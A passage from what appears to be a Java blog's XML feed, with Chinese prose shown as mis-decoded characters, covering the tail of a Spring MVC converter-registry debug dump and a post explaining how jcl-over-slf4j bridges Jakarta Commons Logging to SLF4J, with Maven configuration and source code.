-&gt; java.lang.Float&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Float: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     54 = &#123;LinkedHashMap$Entry@6651&#125; &quot;java.math.BigInteger -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigInteger -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     55 = &#123;LinkedHashMap$Entry@6652&#125; &quot;java.lang.String -&gt; java.math.BigInteger&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigInteger: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     56 = &#123;LinkedHashMap$Entry@6653&#125; &quot;java.lang.Byte -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Byte -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     57 = &#123;LinkedHashMap$Entry@6654&#125; &quot;java.lang.String -&gt; java.lang.Byte&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Byte: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     58 = &#123;LinkedHashMap$Entry@6655&#125; &quot;java.lang.Double -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Double -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     59 = &#123;LinkedHashMap$Entry@6656&#125; &quot;java.lang.String -&gt; java.lang.Double&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Double: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     60 = &#123;LinkedHashMap$Entry@6657&#125; &quot;java.lang.Short -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Short -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     61 = &#123;LinkedHashMap$Entry@6658&#125; &quot;java.lang.String -&gt; java.lang.Short&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Short: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     62 = &#123;LinkedHashMap$Entry@6659&#125; &quot;java.lang.Long -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     63 = &#123;LinkedHashMap$Entry@6660&#125; &quot;java.lang.String -&gt; java.lang.Long&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.lang.Long: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Long: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     64 = &#123;LinkedHashMap$Entry@6661&#125; &quot;java.math.BigDecimal -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigDecimal -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     65 = &#123;LinkedHashMap$Entry@6662&#125; &quot;java.lang.String -&gt; java.math.BigDecimal&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigDecimal: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     66 = &#123;LinkedHashMap$Entry@6663&#125; &quot;java.util.Date -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@a178d09,java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@551d27e0&quot;</span><br><span class="line">     67 = &#123;LinkedHashMap$Entry@6664&#125; &quot;java.util.Date -&gt; java.util.Calendar&quot; -&gt; &quot;java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@2bd20c9a,java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@1c6b5a31&quot;</span><br><span class="line">     68 = &#123;LinkedHashMap$Entry@6665&#125; &quot;java.util.Calendar -&gt; java.util.Date&quot; -&gt; &quot;java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@2aa2f370,java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@163cf3e3&quot;</span><br><span class="line">     69 = &#123;LinkedHashMap$Entry@6666&#125; &quot;java.util.Calendar -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@2db18b62,java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@6bcdf637&quot;</span><br><span class="line">     70 = &#123;LinkedHashMap$Entry@6667&#125; &quot;java.lang.Long -&gt; java.util.Date&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@56c9b14d,java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@271bf39c&quot;</span><br><span class="line">     71 = &#123;LinkedHashMap$Entry@6668&#125; &quot;java.lang.Long -&gt; java.util.Calendar&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@6d08686,java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@2a8b425&quot;</span><br><span class="line">     72 = &#123;LinkedHashMap$Entry@6669&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalDateConverter@19f02ee4&quot;</span><br><span class="line">     73 = &#123;LinkedHashMap$Entry@6670&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalTimeConverter@618fb955&quot;</span><br><span class="line">     74 = &#123;LinkedHashMap$Entry@6671&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateConverter@63e9f754&quot;</span><br><span class="line">     75 = &#123;LinkedHashMap$Entry@6672&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalTimeConverter@24a76e90&quot;</span><br><span class="line">     76 = &#123;LinkedHashMap$Entry@6673&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateTimeConverter@3cb8e3ee&quot;</span><br><span class="line">     77 = &#123;LinkedHashMap$Entry@6674&#125; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToOffsetDateTimeConverter@2061a03d&quot;</span><br><span class="line">     78 = &#123;LinkedHashMap$Entry@6675&#125; &quot;java.time.ZonedDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToInstantConverter@c1ea032&quot;</span><br><span class="line">     79 = &#123;LinkedHashMap$Entry@6676&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateConverter@13d29ccf&quot;</span><br><span class="line">     80 = &#123;LinkedHashMap$Entry@6677&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalTimeConverter@680eaac8&quot;</span><br><span class="line">     81 = &#123;LinkedHashMap$Entry@6678&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateTimeConverter@45438fbc&quot;</span><br><span class="line">     82 = &#123;LinkedHashMap$Entry@6679&#125; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToZonedDateTimeConverter@3ca5a816&quot;</span><br><span class="line">     83 = &#123;LinkedHashMap$Entry@6680&#125; &quot;java.time.OffsetDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToInstantConverter@3b166fa9&quot;</span><br><span class="line">     84 = &#123;LinkedHashMap$Entry@6681&#125; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToZonedDateTimeConverter@2653dae9&quot;</span><br><span class="line">     85 = &#123;LinkedHashMap$Entry@6682&#125; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToOffsetDateTimeConverter@7f348ff0&quot;</span><br><span class="line">     86 = &#123;LinkedHashMap$Entry@6683&#125; &quot;java.util.Calendar -&gt; java.time.LocalDate&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateConverter@6e407d18&quot;</span><br><span class="line">     87 = &#123;LinkedHashMap$Entry@6684&#125; &quot;java.util.Calendar -&gt; java.time.LocalTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalTimeConverter@66a32c5e&quot;</span><br><span class="line">     88 = &#123;LinkedHashMap$Entry@6685&#125; &quot;java.util.Calendar -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateTimeConverter@5e9f36f1&quot;</span><br><span class="line">     89 = &#123;LinkedHashMap$Entry@6686&#125; &quot;java.util.Calendar -&gt; java.time.Instant&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToInstantConverter@50f69dd&quot;</span><br><span class="line">     90 = &#123;LinkedHashMap$Entry@6687&#125; &quot;java.lang.Long -&gt; java.time.Instant&quot; -&gt; &quot;java.lang.Long -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$LongToInstantConverter@684a7cd9&quot;</span><br><span class="line">     91 = &#123;LinkedHashMap$Entry@6688&#125; &quot;java.time.Instant -&gt; java.lang.Long&quot; -&gt; &quot;java.time.Instant -&gt; java.lang.Long : org.springframework.format.datetime.standard.DateTimeConverters$InstantToLongConverter@17f47c52&quot;</span><br><span class="line">     92 = &#123;LinkedHashMap$Entry@6689&#125; &quot;java.time.LocalDate -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0&quot;</span><br><span class="line">     93 = &#123;LinkedHashMap$Entry@6690&#125; &quot;java.lang.String -&gt; java.time.LocalDate&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDate: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDate: org.springframework.format.datetime.standard.TemporalAccessorParser@75d32f15&quot;</span><br><span class="line">     94 = &#123;LinkedHashMap$Entry@6691&#125; &quot;java.time.LocalTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41f1db11&quot;</span><br><span class="line">     95 = &#123;LinkedHashMap$Entry@6692&#125; &quot;java.lang.String -&gt; java.time.LocalTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2ea20f2c&quot;</span><br><span class="line">     96 = &#123;LinkedHashMap$Entry@6693&#125; &quot;java.time.LocalDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41fc9576&quot;</span><br><span class="line">     97 = &#123;LinkedHashMap$Entry@6694&#125; &quot;java.lang.String -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2dbba1db&quot;</span><br><span class="line">     98 = &#123;LinkedHashMap$Entry@6695&#125; &quot;java.time.ZonedDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.ZonedDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@625dde2e&quot;</span><br><span class="line">     99 = &#123;LinkedHashMap$Entry@6696&#125; &quot;java.lang.String -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.ZonedDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@5cb87626&quot;</span><br><span class="line">   converterCache = &#123;ConcurrentReferenceHashMap@6591&#125;  size = 1</span><br><span class="line">    0 = &#123;ConcurrentReferenceHashMap$Entry@7099&#125; &quot;ConverterCacheKey [sourceType = java.lang.String, targetType = @org.springframework.web.bind.annotation.RequestParam java.lang.String]&quot; -&gt; &quot;NO_OP&quot;</span><br><span class="line">  propertyEditorRegistrars = null</span><br></pre></td></tr></table></figure>
<h3 id="parameterNameDiscoverer"><a href="#parameterNameDiscoverer" class="headerlink" title="parameterNameDiscoverer"></a>parameterNameDiscoverer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.parameterNameDiscoverer = &#123;DefaultParameterNameDiscoverer@4866&#125; </span><br><span class="line"> parameterNameDiscoverers = &#123;LinkedList@7309&#125;  size = 2</span><br><span class="line">  0 = &#123;StandardReflectionParameterNameDiscoverer@7311&#125; </span><br><span class="line">  1 = &#123;LocalVariableTableParameterNameDiscoverer@7312&#125;</span><br></pre></td></tr></table></figure>
<p>å®¹å™¨çš„å¯åŠ¨è¿‡ç¨‹ä»¥åŠä¸€æ¬¡è¯·æ±‚çš„è¯¦ç»†å¤„ç†è¿‡ç¨‹: <a href="springmvc.log">å¯åŠ¨æ—¥å¿—</a></p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring mvc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å°†å…¶ä»–æ—¥å¿—æ¡†æ¶æ¡¥æ¥åˆ°slf4j]]></title>
      <url>http://qsli.github.io/2018/05/05/slf4j-bridge/</url>
      <content type="html"><![CDATA[<h2 id="SLF4J"><a href="#SLF4J" class="headerlink" title="SLF4J"></a>SLF4J</h2><p>javaä¸–ç•Œçš„æ—¥å¿—æ¡†æ¶å¤ªå¤šäº†, <code>Jakarta Commons Logging (JCL)</code>,  java.util.logging (jul), Log4j, Logbackç­‰ç­‰. å…¶ä¸­ log4jå’Œlogbackæ˜¯åŒä¸€ä¸ªä½œè€…å†™çš„, è¿™ä¸ªä½œè€…ä¸ºäº†ç»Ÿä¸€æ—¥å¿—çš„API, åˆåˆ›ä½œäº†SLF4J, SLF4Jé‡‡ç”¨é—¨é¢æ¨¡å¼å®šä¹‰äº†æ—¥å¿—æ“ä½œçš„API, ä½†æ˜¯å¹¶æ²¡æœ‰æä¾›å®ç°,<br>å…·ä½“çš„å®ç°ç”±ç”¨æˆ·å¼•å…¥çš„jaråŒ…å†³å®š, æ¯”å¦‚Log4jæˆ–è€…Logbackç­‰.</p>
<p>ä¸ºäº†èƒ½è®©ä¹‹å‰çš„é¡¹ç›®, æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå¤è€çš„é¡¹ç›®ä½¿ç”¨äº† JCL, ä¹Ÿèƒ½ä½¿ç”¨<code>SLF4J</code>å¸¦æ¥çš„å¥½å¤„(æ¥å£å’Œå®ç°åˆ†ç¦»), å°±å‡ºç°äº†æ¡¥æ¥çš„éœ€æ±‚.</p>
<p> <img src="https://www.slf4j.org/images/legacy.png" alt></p>
<p> ä¸€æ—¦æ¡¥æ¥åˆ°äº†<code>SLF4J</code>, åº•å±‚çš„æ—¥å¿—å®ç°å°±å¯ä»¥éšä¾¿é€‰äº†.</p>
<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p> è¿™é‡Œæ‹¿<code>JCL</code>ä¸ºä¾‹, ä»‹ç»ä¸‹å¦‚ä½•ä½¿ç”¨æ¡¥æ¥åŒ….</p>
<ol>
<li>excludeæ‰<code>JCL</code>å¯¹åº”çš„jaråŒ…</li>
<li>å¼•å…¥<code>jcl-over-slf4j</code></li>
</ol>
<p>æ¯”å¦‚æ‹¿<code>spring mvc</code>ä¸ºä¾‹, ä»–å†…éƒ¨ä½¿ç”¨çš„æ˜¯<code>JCL</code>ä½œä¸ºæ—¥å¿—å®ç°, æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--exclude--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;sl4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/jcl-over-slf4j --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h2><p>æ¡¥æ¥çš„å®ç°åŸç†å°±æ˜¯ä¸å¼•å…¥<code>JCL</code>ç­‰ä¹‹å‰åŒ…çš„å®ç°, åœ¨æ¡¥æ¥çš„jaråŒ…ä¸­å®ç°ä¸€å¥—ç›¸åŒçš„api.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">âœ  jcl-over-slf4j-1.7.25-sources  tree</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ META-INF</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ MANIFEST.MF</span><br><span class="line">â”‚Â Â  â””â”€â”€ services</span><br><span class="line">â”‚Â Â      â””â”€â”€ org.apache.commons.logging.LogFactory</span><br><span class="line">â””â”€â”€ org</span><br><span class="line">    â””â”€â”€ apache</span><br><span class="line">        â””â”€â”€ commons</span><br><span class="line">            â””â”€â”€ logging</span><br><span class="line">                â”œâ”€â”€ impl</span><br><span class="line">                â”‚Â Â  â”œâ”€â”€ NoOpLog.java</span><br><span class="line">                â”‚Â Â  â”œâ”€â”€ package.html</span><br><span class="line">                â”‚Â Â  â”œâ”€â”€ SimpleLog.java</span><br><span class="line">                â”‚Â Â  â”œâ”€â”€ SLF4JLocationAwareLog.java</span><br><span class="line">                â”‚Â Â  â”œâ”€â”€ SLF4JLogFactory.java</span><br><span class="line">                â”‚Â Â  â””â”€â”€ SLF4JLog.java</span><br><span class="line">                â”œâ”€â”€ LogConfigurationException.java</span><br><span class="line">                â”œâ”€â”€ LogFactory.java</span><br><span class="line">                â”œâ”€â”€ Log.java</span><br><span class="line">                â””â”€â”€ package.html</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>LogFactory</code>ä¸­ä½¿ç”¨çš„æ˜¯<code>SLF4JLogFactory</code>æ¥è·å–<code>Logger</code>, æœ€ç»ˆç”¨åˆ°çš„æ˜¯<code>slf4j-api</code>ä¸­å®šä¹‰çš„æ–¹æ³•.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.commons.logging.LogFactory</span></span><br><span class="line"><span class="keyword">static</span> LogFactory logFactory = <span class="keyword">new</span> SLF4JLogFactory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.logging.impl.SLF4JLogFactory#getInstance(java.lang.String)</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Log <span class="title">getInstance</span><span class="params">(String name)</span> <span class="keyword">throws</span> LogConfigurationException </span>&#123;</span><br><span class="line">        Log instance = loggerMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (instance != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log newInstance;</span><br><span class="line">            Logger slf4jLogger = LoggerFactory.getLogger(name);</span><br><span class="line">            <span class="keyword">if</span> (slf4jLogger <span class="keyword">instanceof</span> LocationAwareLogger) &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLocationAwareLog((LocationAwareLogger) slf4jLogger);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLog(slf4jLogger);</span><br><span class="line">            &#125;</span><br><span class="line">            Log oldInstance = loggerMap.putIfAbsent(name, newInstance);</span><br><span class="line">            <span class="keyword">return</span> oldInstance == <span class="keyword">null</span> ? newInstance : oldInstance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://www.slf4j.org/legacy.html" rel="external nofollow noopener noreferrer" target="_blank">Log4j Bridge</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/24272450" rel="external nofollow noopener noreferrer" target="_blank">Java æ—¥å¿—æ¡†æ¶è§£æ(ä¸Š) - å†å²æ¼”è¿›</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/24275518" rel="external nofollow noopener noreferrer" target="_blank">Java æ—¥å¿—æ¡†æ¶è§£æ(ä¸‹) - æœ€ä½³å®è·µ</a></li>
<li><a href="http://tech.lede.com/2017/02/06/rd/server/log4jSearch/index.html" rel="external nofollow noopener noreferrer" target="_blank">æ—¥å¿—å·¥å…·ç°çŠ¶è°ƒç ” | ç½‘æ˜“ä¹å¾—æŠ€æœ¯å›¢é˜Ÿ</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> logback </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[dubboæ³›åŒ–è°ƒç”¨åŸç†]]></title>
      <url>http://qsli.github.io/2018/05/02/dubbo-generic-invoke/</url>
